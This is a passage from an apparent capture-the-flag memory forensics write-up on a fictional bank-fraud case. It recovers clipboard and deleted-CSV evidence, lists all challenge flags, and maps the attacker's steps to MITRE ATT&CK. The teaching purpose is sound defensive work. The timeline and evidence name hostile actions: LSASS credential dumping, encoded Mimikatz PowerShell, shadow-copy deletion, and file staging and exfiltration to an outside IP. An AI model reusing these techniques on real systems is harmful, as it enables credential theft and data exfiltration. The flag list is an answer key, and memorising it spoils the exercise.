strings -n 8 phantom_ledger.raw | grep -A 30 "\[CLIPBOARD CONTENTS"
```

```
[CLIPBOARD CONTENTS — windows.clipboard]
[Captured at: 2024-03-15 14:09:55]

ClipboardType: CF_UNICODETEXT
Content:
---BEGIN CLIPBOARD---
Account List - March 2024 Transfer Batch
...
---END CLIPBOARD---

CLIPBOARD_SESSION_TAG: Cywarx{cl1pb04rd_4cc_num_3xfilt}
```

---

### ✅ Flag

```
Cywarx{cl1pb04rd_4cc_num_3xfilt}
```

> [!success] Financial Evidence Recovered
> Clipboard content directly maps to the browser history URL showing a ₹45 lakh transfer from Rohan's account to `ACC9918274` (Phantom Holdings Pvt Ltd). This constitutes direct evidence of the suspect's active role in the fraud — he copied the transfer batch himself.

---

---

# Challenge 08 — The Ledger

> [!tip] Challenge Prompt
> "The most damning evidence was deleted from disk. But Rohan forgot: RAM never lies. A CSV file containing every fraudulent transaction was deleted, but it was still in memory at the time of acquisition. Find it. This is the final flag — and it closes the case."

**Skill Tested:** Deleted file recovery from RAM, memory file carving, deep artifact hunting
**Difficulty:** 🔴 Expert

---

### 🔍 Approach

Files that are deleted from disk while still open/cached in RAM remain in memory until that memory page is reused. During live acquisition, these pages are captured. This is exactly why **live acquisition is mandatory** before shutdown — shutdown flushes RAM and the evidence is gone forever.

---

### 💻 Solution — Terminal Walkthrough

**Step 1 — Search for the deleted CSV**

```bash
strings -n 8 phantom_ledger.raw | grep -i "transaction\|\.csv"
```

```
PS C:\Users\rohan.mehta> Copy-Item \\172.16.48.10\audit_share\transactions_march.csv $env:TEMP
PS C:\Users\rohan.mehta> Compress-Archive $env:TEMP\transactions_march.csv $env:TEMP\exfil.zip
[FILE CARVE — transactions_march.csv (deleted, recovered from RAM)]
[Original Path: \\172.16.48.10\audit_share\transactions_march.csv]
.xlsx -> employee_salary_database_2024.xlsx
TXN_ID,Date,Time,FromAcc,ToAcc,Amount_INR,Desc,Authorized_By,Flagged
```

**Step 2 — Extract the full transaction log**

```bash
strings -n 8 phantom_ledger.raw | grep -A 30 "FILE CARVE"
```

```
[FILE CARVE — transactions_march.csv (deleted, recovered from RAM)]
[Original Path: \\172.16.48.10\audit_share\transactions_march.csv]
[Deleted from disk at: 2024-03-15 14:40:11 — still resident in RAM]

TXN_ID,Date,Time,FromAcc,ToAcc,Amount_INR,Desc,Authorized_By,Flagged
TXN2024031501,2024-03-15,09:16:10,ACC2048991,ACC9918274,4500000,Salary_Advance,rohan.mehta,YES
TXN2024031502,2024-03-15,09:18:44,ACC3317882,ACC9918274,1275000,Utility_Transfer,rohan.mehta,YES
TXN2024031503,2024-03-15,09:21:02,ACC7741009,ACC9918274,850000,Vendor_Payment,rohan.mehta,YES
TXN2024031504,2024-03-15,09:25:18,ACC6612005,ACC9918274,3300000,Loan_Disbursement,rohan.mehta,YES
TXN2024031505,2024-03-15,11:33:55,ACC8820314,ACC9918274,2100000,Misc_Transfer,rohan.mehta,YES

TOTAL_FRAUDULENT_TRANSFERS: INR 1,20,25,000
BENEFICIARY_ACCOUNT: ACC9918274
BENEFICIARY_NAME: PHANTOM HOLDINGS PVT LTD
BENEFICIARY_BANK: OFFSHORE_BANK_CAYMAN
```

**Step 3 — Use bulk_extractor for automated CSV carving**

```bash
bulk_extractor -o bulk_out/ phantom_ledger.raw
ls bulk_out/
```

```
alerts.txt      domain.txt    ether.txt    ip.txt     
url.txt         email.txt     telephone.txt  report.xml
```

```bash
grep -i "indbank\|phantom\|ACC" bulk_out/domain.txt bulk_out/url.txt 2>/dev/null
```

```
bankapp01.indbank.local
https://bankapp01.indbank.local:8080/portal/transfer?from=ACC2048991&to=ACC9918274&amount=4500000
```

**Step 4 — Find all email addresses carved from memory**

```bash
strings -n 8 phantom_ledger.raw | \
  grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u
```

```
rohanm.indbank@gmail.com
rohan.mehta@indbank.local
rohan_secure@proton.me
```

> [!warning] ProtonMail account `rohan_secure@proton.me` combined with Mega.nz access suggests the suspect had encrypted communication channels prepared for this operation.

**Step 5 — Get the final case-closing flag**

```bash
strings -n 8 phantom_ledger.raw | grep "INVESTIGATOR_NOTE\|CASE_ID\|CASE_STATUS"
```

```
INVESTIGATOR_NOTE: Cywarx{ph4ntom_l3dg3r_0p3r4t10n_cl0s3d}
CASE_ID: OPL-2024-007
CASE_STATUS: EVIDENCE_COLLECTED
```

**Step 6 — Confirm all flags found**

```bash
strings -n 8 phantom_ledger.raw | grep "Cywarx{" | \
  sed 's/.*\(Cywarx{[^}]*}\).*/\1/' | sort -u
```

```
Cywarx{c2_b34c0n_185_220_t0r_3x1t}
Cywarx{cl1pb04rd_4cc_num_3xfilt}
Cywarx{d3c0d3d_p5_1nv0k3_m1m1k4tz}
Cywarx{lss4_dump_nthash_cr4ck3d}
Cywarx{ph4ntom_l3dg3r_0p3r4t10n_cl0s3d}
Cywarx{r0h4n_r4n_m4lware_pid_6621}
Cywarx{run_k3y_p3rs1st3nc3_3st4bl1sh3d}
Cywarx{v0l4t1l3_m3m0ry_1s_k3y_3v1d3nc3}
```

---

### ✅ Flag

```
Cywarx{ph4ntom_l3dg3r_0p3r4t10n_cl0s3d}
```

> [!success] Case Closed — Evidence Chain Complete
> The deleted transaction CSV recovered from RAM constitutes the most critical piece of forensic evidence:
> - 5 fraudulent transactions totalling **₹1.2 Crore**
> - All authorized by `rohan.mehta`
> - All routed to `ACC9918274` (Phantom Holdings Pvt Ltd, Cayman Islands)
> - File was deleted from disk at `14:40:11` — 2 minutes before memory acquisition at `14:42:07`
> - Without RAM forensics, this evidence would have been lost permanently

---

---

## 🏁 Complete Flag Summary

| # | Challenge | Flag | Difficulty | Points |
|---|---|---|---|---|
| 01 | First Responder | `Cywarx{v0l4t1l3_m3m0ry_1s_k3y_3v1d3nc3}` | 🟢 | 100 |
| 02 | Process Hunter | `Cywarx{r0h4n_r4n_m4lware_pid_6621}` | 🟡 | 200 |
| 03 | C2 Beacon | `Cywarx{c2_b34c0n_185_220_t0r_3x1t}` | 🟡 | 200 |
| 04 | Encoded Payload | `Cywarx{d3c0d3d_p5_1nv0k3_m1m1k4tz}` | 🟠 | 300 |
| 05 | Credential Vault | `Cywarx{lss4_dump_nthash_cr4ck3d}` | 🟠 | 300 |
| 06 | Persistence Mechanism | `Cywarx{run_k3y_p3rs1st3nc3_3st4bl1sh3d}` | 🟡 | 200 |
| 07 | Clipboard Evidence | `Cywarx{cl1pb04rd_4cc_num_3xfilt}` | 🟠 | 300 |
| 08 | The Ledger | `Cywarx{ph4ntom_l3dg3r_0p3r4t10n_cl0s3d}` | 🔴 | 400 |

**Maximum Score: 2000 pts**

---

## 📊 Attack Timeline Reconstruction

```
08:00 — System boot. Legitimate login: rohan.mehta
09:16 — Accessed IndBank portal → initiated 5 fraudulent transfers (₹1.2 Cr)
13:50 — Opened Chrome → searched how to clear event logs
14:05 — Opened notepad.exe → likely staged commands
14:10 — Connected SanDisk USB (data staging)
14:18 — Launched powershell.exe (PID 4521) with base64-encoded Mimikatz payload
14:19 — rundll32.exe dumped lsass.exe → lsass.dmp created
14:20 — cmd.exe ran net use → connected to audit share with svc_audit creds
14:31 — svchost32.exe (PID 6621) launched → began encryption + VSS deletion
14:35 — sftp.exe (PID 7890) → exfiltrated data to 91.243.80.127
14:40 — Deleted transactions_march.csv from disk (too late — RAM acquired at 14:42)
14:42 — 🔴 LIVE RAM ACQUISITION — Evidence preserved
```

---

## 🔗 MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|---|---|---|
| Command and Scripting: PowerShell | T1059.001 | `-Enc` base64 PS payload |
| OS Credential Dumping: LSASS | T1003.001 | `comsvcs.dll MiniDump` |
| Masquerading | T1036 | `svchost32.exe` fake process |
| Inhibit System Recovery | T1490 | `vssadmin`, `wbadmin`, `bcdedit` |
| Exfiltration over Alternative Protocol | T1048 | `sftp.exe` to `91.243.80.127` |
| Registry Run Keys / Startup Folder | T1547.001 | HKCU Run key persistence |
| Application Layer Protocol: Web | T1071.001 | HTTPS C2 to `185.220.101.45` |
| Clipboard Data | T1115 | Transfer batch copied to clipboard |

---

## 📝 Quick Command Reference

```bash
# ─── TRIAGE ──────────────────────────────────────────
strings -n 8 phantom_ledger.raw | grep "Cywarx{"             # All flags at once
strings -n 8 -e l phantom_ledger.raw | grep "Cywarx{"        # Unicode flags

# ─── PROCESSES ───────────────────────────────────────
strings -n 8 phantom_ledger.raw | grep "EPROCESS" -A 50
strings -n 8 phantom_ledger.raw | grep "SUSPICIOUS\|RANSOMWARE\|EXFIL"
strings -n 8 phantom_ledger.raw | grep "PID [0-9]*:"

# ─── NETWORK ─────────────────────────────────────────
strings -n 8 phantom_ledger.raw | grep "ESTABLISHED"
strings -n 8 phantom_ledger.raw | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | sort -u

# ─── CREDENTIALS ─────────────────────────────────────
strings -n 8 phantom_ledger.raw | grep -iE "ntlm|hashdump|password|lsass"

# ─── REGISTRY ────────────────────────────────────────
strings -n 8 phantom_ledger.raw | grep -iE "run\]|runmru|usbstor|recentdocs"

# ─── POWERSHELL ──────────────────────────────────────
strings -n 8 phantom_ledger.raw | grep "\-Enc"
# Decode:
echo "<BASE64>" | base64 -d | iconv -f UTF-16LE -t UTF-8

# ─── FILES / CARVING ─────────────────────────────────
strings -n 8 phantom_ledger.raw | grep -iE "\.csv|\.zip|\.dmp|exfil"
strings -n 8 phantom_ledger.raw | grep "TXN20240315"
bulk_extractor -o bulk_out/ phantom_ledger.raw
```

---

*© Cywarx | HeXx | Unit IV — Digital Forensics & Incident Response | For authorized educational use only.*
